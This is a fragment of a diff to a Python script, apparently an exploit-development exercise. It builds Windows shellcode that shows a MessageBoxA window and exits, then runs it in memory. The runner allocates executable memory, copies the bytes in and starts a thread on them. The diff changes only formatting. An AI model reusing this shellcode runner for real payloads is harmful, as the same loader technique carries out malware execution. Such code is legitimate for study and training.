         push_instr_header,                           # Push the header text
-        "       mov ebx, esp                    ;",  # Store the pointer to the window header in ebx
+        # Store the pointer to the window header in ebx
+        "       mov ebx, esp                    ;",
         "       xor eax, eax                    ;",  # Null EAX
         "       push eax                        ;",  # Create a null byte on the stack
         push_instr_text,                             # Push the text
-        "       mov ecx, esp                    ;",  # Store the pointer to the window text in ecx
+        # Store the pointer to the window text in ecx
+        "       mov ecx, esp                    ;",
         "       xor eax, eax                    ;",  # Null EAX
-        "       push eax                        ;",  # Create a null byte on the stack for uType=0x00000000
-        "       push ebx                        ;",  # Put a pointer to the window header on the stack
-        "       push ecx                        ;",  # Put a pointer to the window text on the stack
-        "       push eax                        ;",  # Create a null byte on the stack for hWnd=0x00000000
-        "       call dword ptr [ebp+0x18]       ;",  # Call MessageBoxA (https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-messageboxa)
+        # Create a null byte on the stack for uType=0x00000000
+        "       push eax                        ;",
+        # Put a pointer to the window header on the stack
+        "       push ebx                        ;",
+        # Put a pointer to the window text on the stack
+        "       push ecx                        ;",
+        # Create a null byte on the stack for hWnd=0x00000000
+        "       push eax                        ;",
+        # Call MessageBoxA (https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-messageboxa)
+        "       call dword ptr [ebp+0x18]       ;",
         "   exec_shellcode:                      ",
         "       xor ecx, ecx                    ;",  # Null ECX
         "       push ecx                        ;",  # uExitCode
@@ -592,7 +706,8 @@ def main(args):
             ctypes.c_int(0x3000),
             ctypes.c_int(0x40),
         )
-        buf = (ctypes.c_char * len(packed_shellcode)).from_buffer(packed_shellcode)
+        buf = (ctypes.c_char * len(packed_shellcode)
+               ).from_buffer(packed_shellcode)
         ctypes.windll.kernel32.RtlMoveMemory(
             ctypes.c_int(ptr), buf, ctypes.c_int(len(packed_shellcode))
         )
@@ -606,7 +721,8 @@ def main(args):
             ctypes.c_int(0),
             ctypes.pointer(ctypes.c_int(0)),
         )
-        ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))
+        ctypes.windll.kernel32.WaitForSingleObject(
+            ctypes.c_int(ht), ctypes.c_int(-1))
 
 
 if __name__ == "__main__":
